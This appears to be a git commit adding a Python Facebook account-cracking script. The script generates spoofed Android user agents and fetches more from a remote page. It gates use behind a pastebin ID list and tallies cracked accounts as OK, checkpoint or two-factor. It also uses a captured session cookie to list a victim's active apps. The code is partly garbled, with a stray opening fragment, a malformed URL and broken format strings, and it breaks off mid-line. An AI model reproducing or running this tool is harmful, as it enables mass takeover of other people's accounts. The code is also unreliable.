010672a713154f52279198a0381033d33d93c462
x1.amjed <123820233+Amjedxx09@users.noreply.github.com>
2023-04-03 03:00:39 +0200

    Add files via upload

---
+++ Amjed.py
@@ -0,0 +1,146 @@
+ThreadPoolExecutor as tred
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import marshal
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python DAMAR.py')
+from bs4 import BeautifulSoup
+def subc():
+   uuid=str(os.geteuid())+str(os.getlogin())
+   id="|".join(uuid)
+   ses=requests.get(".https://pastebin.com/nuRMU3hT").text
+   if id in ses:
+   	pass
+   else:
+   	print("Your Id "+id)
+   	print('--------- ALKEESH---------')
+   	sys.exit()
+subc()
+   	
+print('--------AMJED_07_ALKEESH---------')
+#amjed
+print('\n')
+ugen = []
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;37m'    
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;37m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+LUQMAN = '{ LUQMAN }'
+for xd in range(10000):
+    a='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+try:
+    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')
+except:
+    pass
+sock=open('ua.html','r').read().splitlines()
+def uaku():
+    try:
+        ua=open('bbnew.txt','r').read().splitlines()
+        for ub in ua:
+            ugen.append(ub)
+    except:
+        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text
+        ua=open('.user-agents.txt','w')
+        aa=re.findall('line">(.*?)<',str(a))
+        for un in aa:
+            ua.write(un+'\n')
+        ua=open('.user-agents.txt','r').read().splitlines()
+loop = 0
+cps = []
+oks = []
+twf = []
+os.system('https://instagram.com/9_v7t?igshid=YmMyMTA2M2Y=')
+os.system('https://instagram.com/9_v7t?igshid=YmMyMTA2M2Y=')
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+logo = """
+\033[1;91m   
+:'######::'##::::'##:'##::::'##::::'###::::'####:'########::
+'##... ##: ##:::: ##: ##:::: ##:::'## ##:::. ##:: ##.... ##:
+ ##:::..:: ##:::: ##: ##:::: ##::'##:. ##::: ##:: ##:::: ##:
+. ######:: ##:::: ##: #########:'##:::. ##:: ##:: ########::
+:..... ##: ##:::: ##: ##.... ##: #########:: ##:: ##.... ##:
+'##::: ##: ##:::: ##: ##:::: ##: ##.... ##:: ##:: ##:::: ##:
+. ######::. #######:: ##:::: ##: ##:::: ##:'####: ########::
+:......::::.......:::..:::::..::..:::::..::....:
+\033[1;91m    
+\033[1;32m      
+\033[1;35m      
+\033[1;34m      
+
+Whatsapp: 0944316832
+  Telegram :AMJED_07_ALKEEH
+              
+\033[1;91m=========================================================="""
+
+
+
+
+
+
+def linex():
+    print(f'{GREEN}==========================================================')
+def checks(oks,cps,twf):
+    if not len(oks) != 0:
+        pass
+    if len(cps) != 0:
+        print('\n\n\x1b[1;97m TOTAL  OK : \x1b[1;97m %s  \x1b[1;97mDAMAR-OK.txt' % (
+            H, P, str(len(oks))))
+        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mDAMAR-CP.txt' %
+              (H, P, str(len(cps))))
+        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mDAMAR-2F.txt' %
+              (H, P, str(len(twf))))
+        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
+        xyz()
+loop = 0
+cps = []
+oks = []
+twf = []
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS 🎮%s  '%(ORANGE))
+    else:
+        print(f'\r {GREEN}[√] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https
